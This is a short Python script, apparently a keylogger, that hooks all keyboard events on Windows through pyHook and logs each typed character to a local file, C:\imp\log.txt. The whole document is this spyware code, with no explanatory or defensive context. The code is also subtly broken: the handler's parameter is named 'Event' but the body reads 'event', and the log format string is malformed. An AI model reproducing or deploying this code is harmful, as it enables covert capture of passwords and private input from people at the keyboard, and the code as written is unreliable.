import logging, sys
import pythoncom, pyHook

file_log = 'C:\\imp\\log.txt'

def OnKeyboardEvent(Event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)')
    logging.log(10, chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
